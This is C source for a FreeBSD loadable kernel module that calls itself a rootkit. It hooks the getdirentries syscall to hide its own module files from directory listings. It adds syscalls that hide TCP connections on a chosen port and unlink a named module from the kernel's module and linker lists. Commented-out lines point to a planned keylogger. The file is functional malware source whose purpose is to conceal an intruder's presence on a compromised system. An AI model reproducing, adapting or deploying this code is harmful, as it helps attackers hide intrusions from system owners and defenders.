#include <sys/param.h>
#include <sys/errno.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>

#include <bsm/audit_kevents.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/malloc.h>
#include <sys/module.h>
#include <sys/priv.h>
#include <sys/proc.h>
#include <sys/socket.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/systm.h>
#include <sys/dirent.h>
#include <sys/syscall.h>

#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/linker.h>

#include <net/if.h>
#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

#include <netinet/udp.h> 
#include <bsm/audit_kevents.h>
#include <sys/queue.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/libkern.h>

#include "interface.h"

extern struct sx kld_sx;
extern linker_file_list_t linker_files;
extern TAILQ_HEAD(modulelist, module) modules;
struct module {
        TAILQ_ENTRY(module)     link;   /* chain together all modules */
        TAILQ_ENTRY(module)     flink;  /* all modules in a file */
        struct linker_file      *file;  /* file which contains this module */
        int                     refs;   /* reference count */
        int                     id;     /* unique id number */
        char                    *name;  /* module name */
        modeventhand_t          handler;        /* event handler */
        void                    *arg;   /* argument for handler */
        modspecific_t           data;   /* module specific data */
};

static int getdirentries_hook(struct thread *td, void *syscall_args) {
    struct getdirentries_args *uap; 
    uap = (struct getdirentries_args *) syscall_args;
    size_t size, count;
    struct dirent *d;
    int error = sys_getdirentries(td, uap);
    size = td->td_retval[0];

    if (size > 0) {
        d = malloc(size, M_TEMP, M_WAITOK);
        copyin(uap->buf, d, size);

        count = size;
        struct dirent *curr_rec = d;
        while (curr_rec->d_reclen != 0 && count > 0) {
            count -= curr_rec->d_reclen;
            // Add more module to hide here
            if (strcmp(curr_rec->d_name, "hiding.ko") == 0 
                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
            ) {
                if (count != 0) {
                    memmove((char *) curr_rec, 
                        (char *) curr_rec + curr_rec->d_reclen, count);
                }
                size -= curr_rec->d_reclen;
            }

            if (count > 0) {
                curr_rec = (struct dirent *) ((char *)curr_rec + curr_rec->d_reclen);
            }
        }
        td->td_retval[0] = size;
        copyout(d, uap->buf, size);
        free(d, M_TEMP);
    }

    return error;
}

struct port_hiding_args {
    u_int16_t port;
};
static int 
port_hiding(struct thread *td, void *syscall_args) {
    CURVNET_SET(vnet0);
    struct port_hiding_args *uap;
    uap = (struct port_hiding_args *) syscall_args;
    struct inpcb *inpb;
    INP_INFO_WLOCK(&V_tcbinfo);

    CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list){
        // if (inpb->inp_vflag & INP_TIMEWAIT) {
        //     continue;
        // }
        INP_RLOCK(inpb);
        if (ntohs(inpb->inp_lport) == uap->port || 
            ntohs(inpb->inp_fport) == uap->port
        ) {
            CK_LIST_REMOVE(inpb, inp_list);
        }
        INP_RUNLOCK(inpb);
    }
    INP_INFO_WUNLOCK(&V_tcbinfo);
    CURVNET_RESTORE()
    return 0;
}

static int port_hiding_offset = NO_SYSCALL;
static struct sysent port_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *) port_hiding,
    .sy_auevent = AUE_NULL
};

struct kld_hiding_args {
    char *mod_name;
};

static int
kld_hiding(struct thread *td, void *syscall_args) {
    struct kld_hiding_args *uap;
    uap = (struct kld_hiding_args *) syscall_args;

    char *mod_name = malloc(256, M_TEMP, M_WAITOK);
    copyinstr(uap->mod_name, mod_name, 256, NULL);
    mtx_lock(&Giant);
    struct module *mod;
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->file->filename, mod_name) == 0) {
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }
    mtx_unlock(&Giant);

    linker_file_t lf;

    sx_xlock(&kld_sx);
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, mod_name) == 0) {
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
    sx_xunlock(&kld_sx);
    free(mod_name, M_TEMP);
    return 0;
}

static struct sysent kld_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *)kld_hiding,
    .sy_auevent = AUE_NULL
};


static int kld_hiding_offset = NO_SYSCALL;

static int load(module_t module, int cmd, void *arg) {
	(void)module;
	(void)arg;

	int error = 0;

    switch (cmd) {
    case MOD_LOAD:
        error = make_rk_dev();

        sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;

        // if (error == 0)
        //     printf("rootkit: module loaded\n");
        /* TODO: Fix this later
            // if error == 0 {
            // 	init_keylogger();
            // }
        */
		// only be initial when device is successfully created
        break;

    case MOD_UNLOAD:
        /* TODO: Fix this later
		    // cleanup_keylogger(); 
        */
		//uninstall hook first
        destroy_rk_dev();
        // printf("rootkit: module unloaded\n");
        break;

    case MOD_SHUTDOWN:
        break;

    default:
        error = EOPNOTSUPP;
        break;
    }

    return error;
}


static moduledata_t rootkit_module = {
	"rootkit",
	load,
	NULL
};

DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
